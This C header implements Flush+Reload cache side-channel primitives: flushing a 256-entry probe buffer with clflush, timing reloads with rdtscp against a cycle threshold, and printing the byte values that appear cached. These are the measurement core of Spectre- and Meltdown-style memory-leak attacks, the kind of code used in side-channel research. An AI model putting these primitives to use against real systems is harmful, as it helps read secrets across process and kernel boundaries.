#ifndef _FLUSH_RELOAD_H_
#define _FLUSH_RELOAD_H_

#include <ctype.h>
#include <stdint.h>

#define STRIDE      2048
#define THRESHOLD   160
#define SERIALIZE   asm volatile("mfence")

static inline __attribute__((always_inline)) void flush(unsigned char *reloadbuffer)
{
    for (size_t k = 0; k < 256; ++k)
    {
        asm volatile("clflush (%0)\n"::"r"((volatile void *)(reloadbuffer + k * STRIDE)));
    }
    SERIALIZE;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void)
{
    uint64_t lo, hi;
    asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void maccess(void *ptr)
{
    *(volatile unsigned char *)(ptr); 
}

static inline __attribute__((always_inline)) void reload(unsigned char *reloadbuffer, size_t *results)
{
    SERIALIZE;
    for (size_t k = 0; k < 256; ++k)
    {                                                                  
        size_t x = ((k * 167) + 13) & (0xff);

        unsigned char *p = reloadbuffer + (STRIDE * x);                                                   

        uint64_t t0 = rdtscp();                                                                         
        maccess(p);
        uint64_t dt = rdtscp() - t0;                                                                    

        if (dt < THRESHOLD) results[x]++;                                                                     
    }                                                                                                   
}                                                                                                       

void print_results(size_t *results, size_t threshold)
{
    for (size_t c = 0; c < 256; ++c)
    {
        if (results[c] >= threshold)
        {
            printf("\t%08zu: %02x (%c)\n", results[c], (unsigned int)c, isprint(c) ? (unsigned int)c : '?');
        }
    }
}

#endif
